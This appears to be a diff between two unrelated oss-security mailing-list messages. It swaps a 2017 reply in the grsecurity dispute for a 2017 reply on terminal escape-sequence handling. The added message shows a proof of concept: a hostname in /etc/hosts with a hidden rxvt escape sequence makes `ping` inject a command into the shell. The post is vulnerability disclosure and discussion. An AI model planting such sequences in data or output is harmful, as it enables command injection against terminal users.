@@ -1,61 +1,67 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/24/10
-Message-ID: <CABniQZPtHV+-XiHPRUGcDe+KwEd1JpPdcDb2Xn63t2Z_Os6ETQ@mail.gmail.com>
-Date: Sat, 24 Jun 2017 23:26:00 +0800
-From: Shawn <citypw@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/17/5
+Message-ID: <CAP145pjXuwa2QwR18Vq29i4aBYqSweHTWt-QYge=JrDxEmZnSQ@mail.gmail.com>
+Date: Wed, 17 May 2017 12:51:57 +0200
+From: Robert Święcki <robert@...ecki.net>
 To: oss-security@...ts.openwall.com
-Cc: Brad Spengler <spender@...ecurity.net>, pageexec@...email.hu,  kernel-hardening@...ts.openwall.com
-Subject: Re: Re: More CONFIG_VMAP_STACK vulnerabilities, refcount_t UAF, and an ignored Secure Boot bypass / rootkit method
+Cc: "Jason A. Donenfeld" <Jason@...c4.com>, rxvt-unicode@...ts.schmorp.de, rxvt@...morp.de
+Subject: Re: terminal emulators' processing of escape sequences
 Content-Type: text/plain; charset=utf-8
 
-Hi Linus,
+Hi,
 
-Not sure how you got the conclusion like "Their patches are pure
-garbage."( https://www.spinics.net/lists/kernel/msg2540934.html). I'm
-wondering why there's a group of ppl called themselves KSPP got paid
-by big corps are still trying to copy+paste PaX/Grsecurity to the
-upstream if you think it's a garbage? Did you try to tell KSPP guys to
-stop their work( cc'ing kernel-hardening mailinglist)? It's so obvious
-to see the most security work( more than just a specific OS)
-originally done by PaX/Grsecurity:
-
-https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/kernel_mitigation.md
-
-And my customers has been suffering from your philosophical ideas of
-"A bug is bug" for too long. I really respect your contributions(
-linux kernel/git) to the FLOSS world. But even the open source king
-can't change the truth:
-
-https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/kernel_vuln_exp.md
-
-btw: You didn't answer Brad's question.
-
-
-On Sat, Jun 24, 2017 at 9:04 AM, Linus Torvalds
-<torvalds@...ux-foundation.org> wrote:
-> On Fri, Jun 23, 2017 at 5:50 PM, Brad Spengler <spender@...ecurity.net> wrote:
+>> > On Tue, May 02, 2017 at 12:05:27AM +0200, Robert ??wi??cki wrote:
+>> >> A harmless example from rxvt - pushing back the new-line character:
+>> >>
+>> >> $ echo -ne "\eGQ;"
+>> >> ;$ 0
+>> >> bash: 0: command not found
+>> >
+>> > Does this also affect rxvt-unicode?
 >>
->> BTW, we're happy to go toe-to-toe with you here in public on actual facts
->> instead of pathetic ad hominems.
+>> It does, actually. I've CCd rxvt-unicode upstream on this in order to
+>> hear their assessment.
 >
-> Quite frankly, I'd much rather see *you* actually send in patches that
-> are acceptable for inclusion, something you've never done.
->
-> As it is, other people have tried to clean up parts of the grsecurity
-> patches, and tried to make them acceptable.
->
-> Wouldn't it be nice if you actually tried to make the baseline actually better?
->
-> Please.
->
->                 Linus
+> There can't be an assessment without knowledge of what to assess - there
+> is little to no information in your mail. I can only guess that somebody
+> for the hundredth time found out that terminals are more than dumb
+> display devices and got excited that, somehow, this might be a security
+> issue. Without knowing details, I can't say for sure, but most likely,
+> this is a security issue the same way blindly feeding unknown commands to
+> your shell is,
 
+Given that arbitrary data can be pushed to terminal emulators via
+seemingly harmless commands (like ping, whois) that people rather
+trust to be robust enough to intetract with arbitrary whois or DNS
+servers, this might be some problem.
 
+Please consider the following example:
+
+$ tail -n1 /etc/hosts | xxd
+00000000: 3132 372e 302e 302e 3309 1b47 513b 205a  127.0.0.3..GQ; Z
+00000010: 5a5a 0a                                  ZZ.
+$ ping ZZZ
+PING ; (127.0.0.3) 56(84) bytes of data.
+^[G0
+64 bytes from ; (127.0.0.3): icmp_seq=1 ttl=64 time=0.039 ms
+^[G0
+64 bytes from ; (127.0.0.3): icmp_seq=2 ttl=64 time=0.032 ms
+^[G0
+^C
+--- ; ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1014ms
+rtt min/avg/max/mdev = 0.032/0.035/0.039/0.006 ms
+^[G0
+$ 0
+bash: 0: command not found
+
+I'm not sure if this works with real reverse DNS look-ups, but with
+/etc/hosts it seems so.
+
+> i.e., it's a problem somewhere else - the protocol between
+> terminals and programs is not a (strong) security barrier.
+>
+> (your echo command is bash-specific, btw.)
 
 -- 
-GNU powered it...
-GPL protect it...
-God blessing it...
-
-regards
-Shawn
+Robert Święcki
